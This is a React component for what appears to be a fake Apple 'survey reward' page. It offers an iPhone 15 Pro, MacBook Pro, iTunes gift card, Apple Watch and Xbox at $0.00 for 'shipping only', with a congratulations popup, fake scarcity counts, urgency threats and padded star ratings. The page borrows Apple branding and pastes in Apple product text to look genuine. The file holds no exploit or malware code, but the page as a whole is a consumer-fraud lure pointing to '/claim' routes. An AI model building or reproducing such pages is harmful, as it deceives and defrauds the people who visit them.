import React from "react";
import { Link } from "react-router-dom";
import Swal from "sweetalert2";

export default function Choose() {
  React.useEffect(() => {

    const link = document.createElement("link");
    link.rel ="stylesheet"
    link.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    document.head.appendChild(link);

    Swal.fire({
      title: "Congratulations",
      html:
        '<img style="margin-bottom:10px" src="./images/apple.jpg" height=50px />' +
        " <hr>" +
        "<p>Congratulations! We have reserved many exclusive items for you</p>",
      cancelButtonColor: "#000",
      showCloseButton: false,
      showConfirmButton: false,
      showCancelButton: true,
      cancelButtonText: "Continue",
    });

    return () => {
        document.head.removeChild(link)
    }
  }, []);

  return (
    <div>
      <nav>
        <p className="announcement">Over 5,000,000 in Offers out so far!</p>
        <div className="navbar">
          <div className="brand">
            <img src="./images/apple.jpg" height="90%" alt="" />
          </div>
        </div>
      </nav>

      <div className="container">
        <div className="survey-notify" style={{ textAlign: "left" }}>
          <p>
            <span style={{ color: "red", fontWeight: "bold" }}>
              Thank you for completing the survey!
            </span>
            <br />
            You helped provide extremely valuable consumer data, you may now
            choose 1 among the folowing exclusive rewards below:
          </p>
          <br />
          <p>
            Please note that if you leave this page without claiming your
            reward, we have no choice but to give another visitor a chance to
            participate in our rewards program.
          </p>
        </div>

        <div className="reward-claim">
          <div></div>
          <div className="reward-image">
            <div style={{ height: "70%", width: "70%" }}>
              <div>
                <img src="./images/iphone.jfif" alt="" />
              </div>
              <div style={{ textAlign: "center" }}>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="">(15900)</span>
              </div>
            </div>
          </div>

          <div className="reward-desc">
            <h2>New Apple iPhone 15 Pro (512GB, Pacific Blue) Unlocked.</h2>
            <br />
            <ul>
              <li>
                iPhone 15 and iPhone 15 Plus are splash, water, and dust
                resistant and were tested under controlled laboratory conditions
                with a rating of IP68 under IEC standard 60529 (maximum depth of
                6 meters up to 30 minutes). Splash, water, and dust resistance
                are not permanent conditions. Resistance might decrease as a
                result of normal wear. Do not attempt to charge a wet iPhone;
                refer to the user guide for cleaning and drying instructions.
                Liquid damage not covered under warranty.
              </li>
              <li>
                Emergency SOS uses a cellular connection or Wi‑Fi Calling.
              </li>
              <li>
                All battery claims depend on network configuration and many
                other factors; actual results will vary. Battery has limited
                recharge cycles and may eventually need to be replaced. Battery
                life and charge cycles vary by use and settings. See
                apple.com/ng/batteries and apple.com/iphone/battery.html for
                more information.
              </li>
              <li>Accessories sold separately.</li>
              <li>
                The display has rounded corners that follow a beautiful curved
                design, and these corners are within a standard rectangle. When
                measured as a standard rectangular shape, the screen is 5.42
                inches (iPhone 13 mini, iPhone 12 mini), 5.85 inches (iPhone 11
                Pro, iPhone XS, iPhone X), 6.06 inches (iPhone 15, iPhone 13
                Pro, iPhone 13, iPhone 12 Pro, iPhone 12, iPhone 11, iPhone XR),
                6.12 inches (iPhone 15 Pro), 6.46 inches (iPhone 11 Pro Max,
                iPhone XS Max), 6.68 inches (iPhone 15 Plus, iPhone 13 Pro Max,
                iPhone 12 Pro Max), or 6.69 inches (iPhone 15 Pro Max)
                diagonally. Actual viewable area is less.
              </li>
            </ul>
            <br />
            <p>
              <span
                style={{
                  color: "red",
                  fontSize: "14px",
                  textDecoration: "line-through",
                }}
              >
                $1200.00
              </span>
              <span style={{ color: "green", fontSize: "18px" }}>$0.00</span>
            </p>
            <p>
              In stock <span style={{ color: "red" }}>(0)</span>
            </p>
            <p>Pay only for shipping</p>

            <div className="link">
                <Link to={"/claim/iphone"}>Claim Reward Now</Link>
              
            </div>
          </div>
        </div>

        <div className="reward-claim">
          <div></div>
          <div className="reward-image">
            <div style={{ height: "70%", width: "70%" }}>
              <div>
                <img src="./images/mac.jpg" alt="" />
              </div>
              <div style={{ textAlign: "center" }}>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star"></span>
                <span className="fa fa-star"></span>
                <span className="">(3900)</span>
              </div>
            </div>
          </div>

          <div className="reward-desc">
            <h2>MacBook Pro</h2>
            <br />
            <p>
              The most powerful and efficient chip ever in a pro laptop, M2 Max
              is engineered to help pros push the boundaries of their ingenuity
              and creativity. With the same next‑generation 12‑core CPU as M2
              Pro, M2 Max has twice the memory bandwidth, up to three times the
              unified memory, and up to 38 GPU cores. So you can render effects,
              merge massive panoramas, and design extreme 3D geometry on an
              unprecedented scale.
            </p>
            <br />
            <p>
              <span
                style={{
                  color: "red",
                  fontSize: "14px",
                  textDecoration: "line-through",
                }}
              >
                $2503.00
              </span>
              <span style={{ color: "green", fontSize: "18px" }}>$0.00</span>
            </p>
            <p>
              In stock <span style={{ color: "red" }}>(0)</span>
            </p>
            <p>Pay only for shipping</p>

            <div className="link">
            <Link to={"/claim/mac"}>Claim Reward Now</Link>
            </div>
          </div>
        </div>

        <div className="reward-claim">
          <div></div>
          <div className="reward-image">
            <div style={{ height: "70%", width: "70%" }}>
              <div>
                <img src="./images/tunes2.webp" alt="" />
              </div>
              <div style={{ textAlign: "center" }}>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="">(43208)</span>
              </div>
            </div>
          </div>

          <div className="reward-desc">
            <h2>Apple iTunes Gift Card</h2>
            <br />
            <p>This item an be Exchanged for malaysian ringgit</p>

            <p>
              <span
                style={{
                  color: "red",
                  fontSize: "14px",
                  textDecoration: "line-through",
                }}
              >
                $200.00
              </span>
              <span style={{ color: "green", fontSize: "18px" }}>$0.00</span>
            </p>
            <p>
              In stock <span style={{ color: "red" }}>(3)</span>
            </p>
            <p>
              Exchanges for <span style={{ color: "green" }}>Rm 953</span>
            </p>
            <p>Free shipping</p>

            <div className="link">
            <Link to={"/claim/itunes"}>Claim Reward Now</Link>
            </div>
            <i style={{ fontSize: "11px" }}>
              Note: This item can be returned to receive equivalent amount in
              Euro, Pounds and MYR only (depends on your country of resident)
            </i>
          </div>
        </div>

        <div className="reward-claim">
          <div></div>
          <div className="reward-image">
            <div style={{ height: "70%", width: "70%" }}>
              <div>
                <img src="./images/iwatch.jpg" alt="" />
              </div>
              <div style={{ textAlign: "center" }}>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star"></span>
                <span className="">(3900)</span>
              </div>
            </div>
          </div>

          <div className="reward-desc">
            <h2>
              New Apple Watch Series 8 (GPS, 40mm) - Blue Aluminum Case with
              Deep Navy Sport Band
            </h2>
            <br />
            <p>About this item</p>
            <ul>
              <li>
                GPS model lets you take calls and reply to texts from your wrist
              </li>
              <li>Measure your blood oxygen with an all-new sensor and app</li>
              <li>
                The Always-On Retina display is 2.5x brighter outdoors when your
                wrist is down
              </li>
              <li>5 5GHz Wi-Fi and U1 Ultra Wideband chip</li>
              <li>
                Track your daily activity on Apple Watch and see your trends in
                the Fitness app on iPhone
              </li>
              <li>Sync your favorite music, podcasts, and audiobooks</li>
            </ul>
            <br />
            <p>
              <span
                style={{
                  color: "red",
                  fontSize: "14px",
                  textDecoration: "line-through",
                }}
              >
                $500.00
              </span>
              <span style={{ color: "green", fontSize: "18px" }}>$0.00</span>
            </p>
            <p>
              In stock <span style={{ color: "red" }}>(0)</span>
            </p>
            <p>Pay only for shipping</p>

            <div className="link">
            <Link to={"/claim/iwatch"}>Claim Reward Now</Link>
            </div>
          </div>
        </div>

        <div className="reward-claim">
          <div></div>
          <div className="reward-image">
            <div style={{ height: "70%", width: "70%" }}>
              <div>
                <img src="./images/xbox.jpg" alt="" />
              </div>
              <div style={{ textAlign: "center" }}>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="fa fa-star checked"></span>
                <span className="">(10238)</span>
              </div>
            </div>
          </div>

          <div className="reward-desc">
            <h2>Xbox Series S</h2>
            <br />
            <ul>
              <li>
                Access your favorite entertainment through apps like YouTube,
                Netflix, and more.
              </li>
              <li>
                Enjoy over 100 games right out of the box with a 1 month Xbox
                Game Pass trial
              </li>
              <li>
                Watch 4K Blu-ray movies and stream 4K video on Netflix, Amazon,
                Hulu, Microsoft Movies & TV, and more.
              </li>
              <li>
                Play with friends and family near and far—sitting together on
                the sofa or around the world on Xbox Live, the fastest, most
                reliable gaming network
              </li>
              <li>Xbox One games and accessories work together.</li>
            </ul>
            <br />
            <p>
              <span
                style={{
                  color: "red",
                  fontSize: "14px",
                  textDecoration: "line-through",
                }}
              >
                $1063.00
              </span>
              <span style={{ color: "green", fontSize: "18px" }}>$0.00</span>
            </p>
            <p>
              In stock <span style={{ color: "red" }}>(0)</span>
            </p>
            <p>Pay only for shipping</p>

            <div className="link">
              <a style={{ backgroundColor: "grey" }}>Currently unavailable</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
